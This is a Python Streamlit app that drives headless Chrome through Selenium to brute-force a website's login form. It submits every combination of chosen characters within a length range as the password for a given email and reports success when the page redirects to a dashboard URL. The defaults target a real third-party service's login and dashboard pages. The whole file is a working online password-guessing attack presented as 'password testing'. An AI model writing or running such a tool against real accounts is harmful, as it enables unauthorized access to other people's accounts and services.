import streamlit as st
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from itertools import product
from webdriver_manager.chrome import ChromeDriverManager
import time

def login_to_website(url, email, email_field_name, password_field_name, login_button_xpath, password, success_url):
    """
    Attempts to log in to the website using the provided credentials.
    Returns:
        bool: True if login is successful (based on URL match), False otherwise.
    """
    try:
        # Set Chrome options for headless execution
        chrome_options = Options()
        chrome_options.add_argument("--headless")  # Run without GUI
        chrome_options.add_argument("--disable-dev-shm-usage")  # Overcome limited resource problems
        chrome_options.add_argument("--no-sandbox")  # Bypass OS security model

        # Install and use ChromeDriver
        service = Service(ChromeDriverManager().install())
        browser = webdriver.Chrome(service=service, options=chrome_options)

        browser.get(url)
        time.sleep(4)

        # Enter email and password
        browser.find_element(By.NAME, email_field_name).send_keys(email)
        browser.find_element(By.NAME, password_field_name).send_keys(password)

        # Click login button
        WebDriverWait(browser, 5).until(
            EC.element_to_be_clickable((By.XPATH, login_button_xpath))
        ).click()

        time.sleep(5)  # Wait for page to load (adjust if necessary)

        # Check if the URL indicates a successful login
        if browser.current_url == success_url:
            return True

    except Exception as e:
        st.error(f"An error occurred during login: {e}")

    finally:
        if 'browser' in locals():
            browser.quit()

    return False


def password_testing(url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url):
    """
    Function to test password combinations for a given email on a specified website.
    """
    st.write(f"Testing password combinations for {email} on {url}...")

    total_attempts = sum(len(input_chars) ** i for i in range(min_length, max_length + 1))
    progress_bar = st.progress(0)
    attempt_count = 0

    for length in range(min_length, max_length + 1):
        for combo in product(input_chars, repeat=length):
            attempt_password = ''.join(combo)
            attempt_count += 1

            # Display the attempted password
            st.text(f"Attempting password: {attempt_password}")

            # Attempt login
            success = login_to_website(
                url, email, email_field_name, password_field_name, login_button_xpath, attempt_password, success_url
            )
            progress = attempt_count / total_attempts
            progress_bar.progress(progress)

            if success:
                st.success(f"Login successful with password: {attempt_password}")
                st.balloons()
                return  # Exit upon successful login

    st.warning("Testing completed. No valid password found.")


# Streamlit App
st.title("Automated Login App with Password Testing")
st.write("Enter your email and test password combinations.")

# Input fields
url = st.text_input("Login URL", placeholder="Enter the login page URL", value="https://app.pallyy.com/login")
email = st.text_input("Email", placeholder="Enter your email")
email_field_name = st.text_input("Email field name (HTML 'name' attribute)", value="email")
password_field_name = st.text_input("Password field name (HTML 'name' attribute)", value="password")
login_button_xpath = st.text_input("Login button XPath", value='/html/body/div[1]/div/div/div/form/button')

# Password testing inputs
input_chars = st.text_input("Input characters for password testing (e.g., 'abc123'):")
min_length = st.number_input("Minimum password length:", min_value=1, value=4)
max_length = st.number_input("Maximum password length:", min_value=1, value=6)

# Input for success URL
success_url = st.text_input("Success URL (URL that indicates successful login)", value="https://app.pallyy.com/dashboard/scheduling/calendar/month")

if st.button("Start Testing"):
    if not url or not email or not input_chars or not success_url:
        st.error("Please provide all inputs.")
    elif min_length > max_length:
        st.error("Minimum length cannot be greater than maximum length.")
    else:
        password_testing(
            url, email, email_field_name, password_field_name, login_button_xpath, input_chars, min_length, max_length, success_url
        )
